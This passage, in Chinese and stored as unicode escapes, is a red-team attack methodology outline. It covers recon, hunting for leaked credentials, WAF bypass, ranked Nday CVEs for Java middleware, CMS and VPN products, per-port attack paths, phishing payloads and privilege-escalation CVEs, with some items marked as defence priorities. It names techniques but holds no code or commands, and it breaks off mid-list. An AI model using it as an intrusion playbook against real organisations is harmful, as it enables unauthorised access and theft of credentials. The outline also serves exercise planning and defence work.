\u5165\u53e3\u6743\u9650\u83b7\u53d6[\u524d\u671f\u4fa6\u5bdf\uff0c\u641c\u96c6\u9636\u6bb5\u672c\u8eab\u5c31\u4e0d\u5b58\u5728\u592a\u591a\u53ef\u9632\u5fa1\u7684\u70b9\uff0c\u975e\u9632\u5fa1\u91cd\u5fc3] \u00b6 \u7ed5CDN\u627e\u51fa\u76ee\u6807\u6240\u6709\u771f\u5b9eip\u6bb5 \u627e\u76ee\u6807\u7684\u5404\u79cdWeb\u7ba1\u7406\u540e\u53f0\u767b\u5f55\u53e3 \u6279\u91cf\u6293\u53d6\u76ee\u6807\u6240\u6709\u771f\u5b9eC\u6bb5 Web banner \u6279\u91cf\u5bf9\u76ee\u6807\u6240\u6709\u771f\u5b9eC\u6bb5\u8fdb\u884c\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u626b\u63cf\u63a2\u6d4b\u8bc6\u522b \u5c1d\u8bd5\u76ee\u6807DNS\u662f\u5426\u5141\u8bb8\u533a\u57df\u4f20\u9001,\u5982\u679c\u4e0d\u5141\u8bb8\u5219\u7ee7\u7eed\u5c1d\u8bd5\u5b50\u57df\u7206\u7834 \u6279\u91cf\u6293\u53d6\u76ee\u6807\u6240\u6709\u5b50\u57df Web banner \u6279\u91cf\u5bf9\u76ee\u6807\u6240\u6709\u5b50\u57df\u96c6\u4e2d\u8fdb\u884c\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u63a2\u6d4b\u8bc6\u522b \u6279\u91cf\u8bc6\u522b\u76ee\u6807 \u6240\u6709\u5b58\u6d3bWeb\u7ad9\u70b9\u7684Web\u7a0b\u5e8f\u6307\u7eb9 \u53ca\u5176\u8be6\u7ec6\u7248\u672c \u4ece Git \u4e2d\u67e5\u627e\u76ee\u6807\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6\u53ca\u8d26\u53f7\u5bc6\u7801,\u5076\u5c14\u751a\u81f3\u8fd8\u80fd\u78b0\u5230\u76ee\u6807\u4e0d\u5c0f\u5fc3\u6cc4\u9732\u7684\u5404\u79cd\u4e91\u7684 \"AccessKey\" \u4ece\u7f51\u76d8/\u767e\u5ea6\u6587\u5e93\u4e2d\u67e5\u627e\u76ee\u6807\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6\u53ca\u8d26\u53f7\u5bc6\u7801 \u4ece\u5404\u7b2c\u4e09\u65b9\u5386\u53f2\u6f0f\u6d1e\u5e93\u4e2d\u67e5\u627e\u76ee\u6807\u66fe\u7ecf\u6cc4\u9732\u7684\u5404\u79cd\u654f\u611f\u8d26\u53f7\u5bc6\u7801 [\u56fd\u5185\u76ee\u6807\u5f88\u597d\u4f7f] \u76ee\u6807Svn\u91cc\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6 \u7f51\u7ad9\u76ee\u5f55\u626b\u63cf [\u67e5\u627e\u76ee\u6807\u7f51\u7ad9\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6, \u7f51\u7ad9\u5907\u4efd\u6587\u4ef6,\u654f\u611f\u914d\u7f6e\u6587\u4ef6, \u6e90\u7801 , \u522b\u4eba\u7684webshell, \u7b49\u7b49\u7b49...] \u76ee\u6807\u7ad9\u70b9\u81ea\u8eab\u5728\u524d\u7aef\u4ee3\u7801\u4e2d\u6cc4\u9732\u7684\u5404\u79cd\u654f\u611f\u4fe1\u606f fofa / shodan / bing / google hacking \u6df1\u5ea6\u5229\u7528 \u641c\u96c6\u76ee\u6807\u5b66\u751f\u5b66\u53f7 / \u5458\u5de5\u5de5\u53f7 / \u76ee\u6807\u90ae\u7bb1 [\u5e76\u987a\u624b\u5230\u5404\u4e2a\u793e\u5de5\u5e93\u4e2d\u53bb\u6279\u91cf\u67e5\u8be2\u8fd9\u4e9b\u90ae\u7bb1\u66fe\u7ecf\u662f\u5426\u6cc4\u9732\u8fc7\u5bc6\u7801 ] \u76ee\u6807\u81ea\u5df1\u5bf9\u5916\u63d0\u4f9b\u7684\u5404\u79cd \u6280\u672f\u6587\u6863 / wiki\u91cc\u6cc4\u9732\u7684\u5404\u79cd\u8d26\u53f7\u5bc6\u7801\u53ca\u5176\u5b83\u654f\u611f\u4fe1\u606f \u76ee\u6807\u5fae\u4fe1\u5c0f\u7a0b\u5e8f \u5206\u6790\u76ee\u6807app Web\u8bf7\u6c42 \u501f\u52a9js\u63a2\u9488\u641c\u96c6\u76ee\u6807\u5185\u7f51\u4fe1\u606f \u60f3\u529e\u6cd5\u6df7\u5165\u76ee\u6807\u7684\u5404\u79cd \u5185\u90e8QQ\u7fa4 / \u5fae\u4fe1\u7fa4 \u5206\u6790\u76ee\u6807\u76f4\u63a5\u4f9b\u5e94\u5546 [\u5c24\u5176\u662f\u6280\u672f\u5916\u5305] \u6839\u636e\u524d\u9762\u5df2\u641c\u96c6\u5230\u7684\u5404\u7c7b\u4fe1\u606f\u5236\u4f5c\u6709\u9488\u5bf9\u6027\u7684\u5f31\u53e3\u4ee4\u5b57\u5178 \u76ee\u6807\u6240\u7528 Waf \u79cd\u7c7b\u8bc6\u522b \u4e0e \u7ed5\u8fc7 BypassWAF \u6587\u4ef6\u4e0a\u4f20 / \u8bfb\u53d6 / \u4e0b\u8f7d BypassWAF Sql\u6ce8\u5165 BypassWAF RCE BypassWAF \u5404\u7c7bJava Web\u4e2d\u95f4\u4ef6\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 BypassWAF Webshell \u514d\u6740 0x02 \u5165\u53e3\u6743\u9650\u83b7\u53d6[ \u5916\u90e8\u9632\u5fa1\u91cd\u5fc3 ( \"\u91cd\u4e2d\u4e4b\u91cd\" ) ] \u00b6 \u6b64\u9636\u6bb5,\u4e3b\u8981\u662f\u9488\u5bf9\u5404\u4e3b\u6d41 \"\u4e2d\u95f4\u4ef6 + \u5f00\u6e90\u7a0b\u5e8f + Web\u670d\u52a1\u7ec4\u4ef6\" \u81ea\u8eab\u7684\u5404\u79cd\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528\u5982\u4e0b\u5df2\u6309 \"\u5b9e\u9645\u653b\u51fb\u5229\u7528\u7684\u96be\u6613\u7a0b\u5ea6\" \u53ca \"\u83b7\u53d6\u5230\u7684shell\u6743\u9650\u9ad8\u4f4e\"\u4e3a\u6807\u51c6\u8fdb\u884c\u4e86\u8be6\u7ec6\u6392\u5e8f,\u7531\u4e8e\u5b8c\u5168\u4ee5\u5b9e\u6218\u5229\u7528\u4e3a\u5bfc\u5411,\u6545\u4ec5\u4ec5\u53ea\u6311\u9009\u4e86\u4e00\u4e9b\u76f8\u5bf9\u4f1a\u7ecf\u5e38\u9047\u5230\u7684,\u4e14\u5b9e\u6218\u4e2d\u786e\u5b9e\u80fd\u6709\u6548\u534f\u52a9\u5feb\u901fgetshell \u7684 \"\u4e2d\u95f4\u4ef6\" , \"\u5f00\u6e90\u7a0b\u5e8f\" \u53ca \"web\u7ec4\u4ef6\" \u9488\u5bf9\u5404\u7c7bJava\u4e2d\u95f4\u4ef6\u7684\u5404\u79cd\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 \u4e0d\u540c\u4e8e\u5176\u5b83\u811a\u672c\u7c7bweb\u7a0b\u5e8f,Java\u7684\u8fd0\u884c\u6743\u9650\u901a\u5e38\u90fd\u6bd4\u8f83\u9ad8,\u751a\u81f3\u5927\u90e8\u5206\u90fd\u662f\u76f4\u63a5\u7528root/administrator/system\u6743\u9650\u5728\u8dd1,\u6240\u4ee5\u62ff\u5230\u7684shell\u6743\u9650\u4e00\u822c\u4e5f\u975e\u5e38\u9ad8,\u901a\u5e38\u90fd\u76f4\u63a5\u662f\u670d\u52a1\u5668\u6743\u9650,\u5c24\u5176\u662f\u5728\u5404\u79cd\u7ea2\u961f\u573a\u666f\u4e2d,\u5165\u4fb5\u8005\u4e00\u822c\u4e5f\u90fd\u4f1a\u9996\u9009\u8fd9\u4e9b\u70b9,\u5e76\u4ee5\u6b64\u4e3a\u7a81\u7834\u53e3\u6765\u83b7\u53d6\u4e00\u4e2a\u7a33\u5b9a\u7684\u8df3\u677f\u673a\u5165\u53e3\u6743\u9650,\u5173\u4e8e\u5230\u5e95\u54ea\u4e9b\u884c\u4e1a\u7279\u522b\u7231\u7528\u54ea\u4e9b\u4e2d\u95f4\u4ef6,\u8fd9\u4e9b\u4e5f\u5e94\u8be5\u90fd\u662f\u6709\u4e8b\u5148\u5206\u6790\u68b3\u7406\u6c47\u603b\u597d\u7684 Struts2 Struts2-005 Struts2-008 Struts2-009 Struts2-013 Struts2-016(\u5b9e\u9645\u4e0a,\u5f88\u591a\u90fd\u8001\u7cfb\u7edf\u90fd\u6f0f\u8865\u4e86\u8fd9\u4e2a\u6d1e,\u6210\u529f\u7387\u8f83\u9ad8) Struts2-019 Struts2-020 Struts2-devmode Struts2-032 Struts2-033 Struts2-037 Struts2-045 Struts2-046 Struts2-048 Struts2-052 Struts2-053 Struts2-057 weblogic CVE-2019-2725 CVE-2019-2729 CVE-2018-3191 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2017-3506 CVE-2017-10271 CVE-2017-3248 CVE-2016-0638 CVE-2016-3510 CVE-2015-4852 CVE-2014-4210 SSRF \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Jboss CVE-2015-7501 CVE-2017-7504 CVE-2017-12149 \u672a\u6388\u6743\u8bbf\u95ee,\u90e8\u7f72webshell \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell wildfly [ jboss 7.x \u6539\u540d\u4e3a wildfly ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Tomcat CVE-2016-8735 CVE-2017-12615 [ readonly \u5b9e\u9645\u8bbe\u4e3a true\u7684\u60c5\u51b5\u8f83\u5c11,\u7a0d\u9e21\u808b ] CVE-2020-1938 [ AJP\u534f\u8bae\u6f0f\u6d1e,\u76f4\u63a5\u628a8009\u7aef\u53e3\u66b4\u9732\u5728\u5916\u7f51\u7684\u4e0d\u592a\u591a,\u7a0d\u9e21\u808b ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshelll [ \u6ce8: 7.x\u7248\u672c\u540e,\u9ed8\u8ba4\u52a0\u4e86\u9632\u7206\u673a\u5236 ] Jekins CVE-2018-1999002 [\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6] \u672a\u6388\u6743\u8bbf\u95ee,\u4efb\u610f\u547d\u4ee4\u6267\u884c \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u4efb\u610f\u547d\u4ee4\u6267\u884c ElasticSearch CVE-2014-3120 [\u4e13\u95e8\u9488\u5bf9\u8001\u7248\u672c(\u65e0\u6c99\u76d2)RCE] CVE-2015-1427 [Groovy RCE] CVE-2015-3337 [\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6] \u672a\u6388\u6743\u8bbf\u95ee,\u654f\u611f\u4fe1\u606f\u6cc4\u9732 RabbitMQ \u5f31\u53e3\u4ee4 Glassfish \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 [ \u4f4e\u7248\u672c ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell IBM Websphere Java \u53cd\u5e8f\u5217\u5316 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Axis2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u76ee\u5f55\u904d\u5386 Apache ActiveMQ \u672a\u6388\u6743\u8bbf\u95ee,5.12 \u4e4b\u524d\u7684\u7248\u672c fileserver\u5b58\u5728 PUT\u4efb\u610f\u5199 CVE-2015-5254 Apache Solr CVE-2017-12629 CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ] Apache Zookeeper \u672a\u6388\u6743\u8bbf\u95ee,\u654f\u611f\u4fe1\u606f\u6cc4\u9732 Apache Shiro\u53cd\u5e8f\u5217\u5316 fastjson <= 1.2.47 \u53cd\u5e8f\u5217\u5316\u5229\u7528 \u9488\u5bf9\u5404\u7c7bWindows php\u96c6\u6210\u73af\u5883 [ \u7531\u4e8e\u6b64\u7c7b\u73af\u5883\u62ff\u5230\u7684Webshell\u6743\u9650\u76f8\u5bf9\u8f83\u9ad8,\u6240\u4ee5,\u901a\u5e38\u4e5f\u662f\u7ea2\u961f\u4eba\u5458\u7684\u9996\u9009\u7a81\u7834\u53e3 ] AppServ Xampp \u5b9d\u5854 PhpStudy ...... \u9488\u5bf9\u5404\u7c7b\u5f00\u6e90\u7a0b\u5e8f\u7684 \u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 Dedecms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 thinkphp 5.x \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 phpcms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 ecshop \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 Metinfo \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 discuz \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 \u5e1d\u56fdcms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 phpmyadmin \u6570\u636e\u5e93\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 wordpress \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 joomla \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 drupal CVE-2018-7600 ,\u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 ...... \u9488\u5bf9\u5176\u5b83\u5404\u7c7bWeb\u7ec4\u4ef6\u7684 \u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 IIS 6.0 RCE \u77ed\u6587\u4ef6\u6f0f\u6d1e PUT \u4efb\u610f\u5199 Webdav RCE CVE-2017-7269 \u7985\u9053\u9879\u76ee\u7ba1\u7406\u7cfb\u7edf SQL\u6ce8\u5165 \u6587\u4ef6\u8bfb\u53d6 \u8fdc\u7a0b\u6267\u884c \u901a\u8fbeOA SQL\u6ce8\u5165 \u4efb\u610f\u4e0a\u4f20 Exchange \u5229\u7528\u63a5\u53e3\u8fdb\u884c\u90ae\u7bb1\u7528\u6237\u540d\u679a\u4e3e \u9488\u5bf9\u5404\u4e2a\u63a5\u53e3\u7684\u5f31\u53e3\u4ee4\u7206\u7834 CVE-2020-0688 [ \u5229\u7528\u524d\u63d0\u662f\u9700\u8981\u5148\u5f97\u6709\u4efb\u610f\u4e00\u4e2a\u90ae\u7bb1\u7528\u6237\u6743\u9650 ] .... Zimbra [ XXE + SSRF => RCE ] CVE-2013-7091 CVE-2016-9924 CVE-2019-9670 Citrix CVE-2019-19781 Jumpserver \u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 Zabbix CVE-2017-2824 SQL\u6ce8\u5165 [ 2.0 \u8001\u7248\u672c ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u654f\u611f\u673a\u5668\u4fe1\u606f\u6cc4\u9732 Cacti \u4f4e\u7248\u672c SQL\u6ce8\u5165 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 Nagios CVE-2016-9565 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 Webmin RCE CVE-2019-15107 PHPMailer CVE-2016-10033 \u6cdb\u5faeOA\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u91d1\u8776OA SQL\u6ce8\u5165 Coremail \u654f\u611f\u6587\u4ef6\u6cc4\u9732 UEditor \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 OpenSSL\u5fc3\u810f\u6ef4\u8840\u6293\u660e\u6587\u8d26\u53f7\u5bc6\u7801 [ Heartbleed ] \u7834\u58f3\u6f0f\u6d1e [ Shellshock ] \u5404\u79cd\u80fd\u5feb\u901fgetshell\u7684\u5e38\u89c4\u57fa\u7840Web\u6f0f\u6d1e\u5229\u7528 [ \u6ce8: \u6709\u4e9b\u6f0f\u6d1e\u5728\u4e0d\u5ba1\u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u5176\u5b9e\u662f\u5f88\u96be\u6709\u6548\u76f2\u6d4b\u5230\u7684 ] \u540e\u53f0\u5f31\u53e3\u4ee4 SSRF sql\u6ce8\u5165 \u8d8a\u6743 \u547d\u4ee4 / \u4ee3\u7801\u6267\u884c / \u53cd\u5e8f\u5217\u5316 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 / \u4e0b\u8f7d / \u8bfb\u53d6 \u5305\u542b XSS\uff08\u5b9e\u9645\u4e0a,XSS\u53ea\u6709\u5728\u9488\u5bf9\u67d0\u4e9b\u7279\u5b9a\u90ae\u7bb1,\u624b\u91cc\u6709\u6d4f\u89c8\u56680day\u65f6\u4ef7\u503c\u624d\u4f1a\u6bd4\u8f83\u5927,\u7ea2\u961f\u573a\u666f\u4e0b\u5176\u5b9e\u5e76\u4e0d\u662f\u975e\u5e38\u81f4\u547d) \u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e \u9488\u5bf9\u5404\u7c7b\u8fb9\u754c\u7f51\u7edc\u8bbe\u5907\u7684\u5404\u79cd\u5229\u7528,\u4e3b\u8981\u662fWeb\u7ba1\u7406\u63a7\u5236\u53f0\u767b\u5f55\u5f31\u53e3\u4ee4\u53ca \u5404\u7c7b\u5df2\u77e5nday\u653b\u51fb\u5229\u7528 Pulse Secure VPN CVE-2019-11510 [ \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 ] Fortinet VPN CVE-2018-13379 [ \u6587\u4ef6\u8bfb\u53d6 ] Sangfor Vpn RCE 0x03 \u5165\u53e3\u6743\u9650\u83b7\u53d6[\u4e13\u95e8\u9488\u5bf9\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u7684\u5404\u79cdgetshell\u5229\u7528\uff0c\u9632\u5fa1\u91cd\u70b9 ( \"\u91cd\u4e2d\u4e4b\u91cd\" )] \u00b6 \u6b64\u5904\u4ec5\u4ec5\u53ea\u6311\u9009\u4e86\u4e00\u4e9b\u5b9e\u6218\u4e2d\u771f\u6b63\u80fd\u534f\u52a9\u5feb\u901fgetshell\u7684\u670d\u52a1,\u5176\u5b83\u7684\u4e00\u4e9b\u76f8\u5bf9\u8fb9\u7f18\u6027\u7684\u670d\u52a1\u5747\u672a\u63d0\u53ca,\u540c\u6837,\u5df2\u6309 \"\u5b9e\u9645\u653b\u51fb\u5229\u7528\u7684\u96be\u6613\u7a0b\u5ea6\" \u53ca \"\u83b7\u53d6\u5230\u7684shell\u6743\u9650\u9ad8\u4f4e\"\u4e3a\u6807\u51c6\u8fdb\u884c\u4e86\u8be6\u7ec6\u6392\u5e8f\u5982\u4e0b,\u5c31\u6bcf\u4e2a\u7aef\u53e3\u7684\u5177\u4f53\u653b\u51fb\u5229\u7528\u65b9\u5f0f,\u8fdb\u884c\u4e86\u7b80\u8981\u8bf4\u660e Top Port List Mssql [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1433\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] SMB [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 445\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] WMI [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 135\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] WinRM [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5985\u7aef\u53e3,\u6b64\u9879\u4e3b\u8981\u9488\u5bf9\u67d0\u4e9b\u9ad8\u7248\u672cWindows, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] RDP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3389\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u522b\u4eba\u7559\u7684shift\u7c7b\u540e\u95e8 ] SSH [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 22\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] ORACLE [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1521\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] Mysql [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3306\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743(\u53ea\u9002\u7528\u4e8e\u90e8\u5206\u8001\u7cfb\u7edf) ] REDIS [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 6379\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u672a\u6388\u6743\u8bbf\u95ee, \u5199\u6587\u4ef6(webshell,\u542f\u52a8\u9879,\u8ba1\u5212\u4efb\u52a1), \u63d0\u6743 ] POSTGRESQL[ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5432\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] LDAP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 389\u7aef\u53e3, \u672a\u6388\u6743\u8bbf\u95ee, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732 ] SMTP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 25\u7aef\u53e3, \u670d\u52a1\u9519\u8bef\u914d\u7f6e\u5bfc\u81f4\u7684\u7528\u6237\u540d\u679a\u4e3e\u6f0f\u6d1e, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] POP3 [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 110\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] IMAP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 143\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Exchange [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 443\u7aef\u53e3, \u63a5\u53e3\u5f31\u53e3\u4ee4\u7206\u7834 eg: Owa,ews,oab,AutoDiscover... pth\u8131\u90ae\u4ef6, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ... ] VNC [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5900\u7aef\u53e3, \u5f31\u53e3\u4ee4 ] FTP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 21\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u533f\u540d\u8bbf\u95ee/\u53ef\u5199, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Rsync [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 873\u7aef\u53e3, \u672a\u6388\u6743, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Mongodb [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 27017\u7aef\u53e3, \u672a\u6388\u6743, \u5f31\u53e3\u4ee4 ] TELNET [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 23\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u540e\u95e8\u690d\u5165 ] SVN [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3690\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] JAVA RMI [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1099\u7aef\u53e3, \u53ef\u80fd\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u5229\u7528 ] CouchDB [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5984\u7aef\u53e3, \u672a\u6388\u6743\u8bbf\u95ee ] 0x04 \u5165\u53e3\u6743\u9650\u83b7\u53d6 \u00b6 \u4f20\u7edf\u9493\u9c7c\u653b\u51fb\u5229\u7528\uff0c\u5b9e\u9645\u62a4\u7f51\u573a\u666f\u4e2d\u7528\u7684\u975e\u5e38\u9891\u7e41\uff0c\u7ec6\u8282\u975e\u5e38\u591a\uff0c\u6b64\u5904\u4e0d\u4e00\u4e00\u5217\u4e3e\uff0c\u9632\u5fa1\u91cd\u70b9 \u53d1\u4fe1\u524d\u671f\u51c6\u5907 \u679a\u4e3e\u6709\u6548\u7684\u76ee\u6807\u90ae\u7bb1\u7528\u6237\u540d\u5217\u8868 \u6279\u91cf\u63a2\u6d4b\u76ee\u6807\u90ae\u7bb1\u5f31\u53e3\u4ee4 \u4f2a\u9020\u53d1\u4fe1\u4eba [ \u53d1\u4fe1\u90ae\u670d\u642d\u5efa ] \u9493\u9c7c\u4fe1 [ \u9488\u5bf9\u4e0d\u540c\u884c\u4e1a\u4e00\u822c\u4e5f\u90fd\u4f1a\u4e8b\u5148\u51c6\u5907\u597d\u5404\u79cd\u5404\u6837\u7684\u9488\u5bf9\u6027\u7684\u53d1\u4fe1\u8bdd\u672f\u6a21\u677f,\u4ee5\u6b64\u6765\u63d0\u5230\u5b9e\u9645\u53d1\u4fe1\u6210\u529f\u7387 ] ...... \u5178\u578b\u6295\u9012\u65b9\u5f0f \u7b2c\u4e00\u79cd,\u76f4\u63a5\u7ed9\u76ee\u6807\u53d1\u9001\u5404\u79cd\u5e38\u89c4\u6728\u9a6c\u4fe1 \u4f20\u7edf\u5b8f\u5229\u7528 \u6346\u7ed1 exe[zip,7z] lnk chm \u81ea\u89e3\u538b \u6728\u9a6c\u94fe\u63a5 OLE CVE-2017-11882 [ \u5229\u7528\u6f0f\u6d1e\u89e6\u53d1 ] ... \u7b2c\u4e8c\u79cd,\u7ed9\u76ee\u6807\u53d1\u9001\u5404\u79cd\u9493\u9c7c\u94fe\u63a5,\u6bd4\u5982, \u5229\u7528\u5404\u79cd\u76ee\u6807\u767b\u5f55\u53e3\u7684\u9493\u9c7c\u9875\u9762\u6765\u7a83\u53d6\u5404\u79cd\u5185\u7f51\u8d26\u53f7\u5bc6\u7801 Vpn Mail OA Net ntlm hash [ \u8fdc\u7a0b\u6a21\u677f\u6ce8\u5165,pdf...\u9493hash,\u56fd\u5185ISP\u8fc7\u6ee4SMB\u6d41\u91cf\u4e0d\u9002\u7528 ] ...... 0x05 \u4e3b\u673a\u5b89\u5168 [ \u63d0\u6743\u5229\u7528\uff0c\u9632\u5fa1\u91cd\u70b9 ] \u00b6 \u4ee5\u4e0b\u53ea\u5355\u72ec\u6311\u4e86\u4e00\u4e9b\u5728 \u901a\u7528\u6027, \u7a33\u5b9a\u6027, \u6613\u7528\u6027, \u5b9e\u9645\u6210\u529f\u7387\u90fd\u76f8\u5bf9\u8f83\u597d\u7684\u6d1e\u548c\u65b9\u5f0f,\u5176\u5b83\u7684\u4e00\u4e9b\"\u8fb9\u7f18\u6027\"\u7684\u5229\u7528\u90fd\u6682\u672a\u63d0\u53ca Windows \u7cfb\u7edf\u6f0f\u6d1e \u672c\u5730\u63d0\u6743 [ \u6210\u529f\u7684\u524d\u63d0\u662f,\u4fdd\u8bc1\u4e8b\u5148\u5df2\u505a\u597d\u5404\u79cd\u9488\u5bf9\u6027\u514d\u6740 ] BypassUAC [ win7 / 8 / 8.1 / 10 ] MS14-058[KB3000061] [\u91cd\u70b9] MS14-068[KB3011780] [\u91cd\u70b9] ms15-051[KB3045171] [\u91cd\u70b9] MS15-077[KB3077657] [\u91cd\u70b9] MS16-032[KB3124280] [\u91cd\u70b9] ms16-075 [\u91cd\u70b9] MS16-135[KB3199135] [\u91cd\u70b9] MS17-010[KB4013389] [\u91cd\u70b9] cve-2019-0708 [\u91cd\u70b9] CVE-2019-0803 [\u91cd\u70b9] CVE-2019-1322 & CVE-2019-1405 [\u91cd\u70b9] cve-2019-12750 [ \u8d5b\u95e8\u94c1\u514b(\u7528\u7684\u8f83\u591a)\u672c\u5730\u63d0\u6743 ] [\u91cd\u70b9] linux \u5185\u6838\u6f0f\u6d1e \u672c\u5730\u63d0\u6743 [ linux-exploit-suggester ] CVE-2016-5195 [\u91cd\u70b9] CVE-2017-16995 CVE-2019-13272 \u5229\u7528\u5404\u7c7b\u7b2c\u4e09\u65b9\u670d\u52a1 / \u8f6f\u4ef6\u5de5\u5177\u63d0\u6743 Mssql [\u91cd\u70b9] Oracle 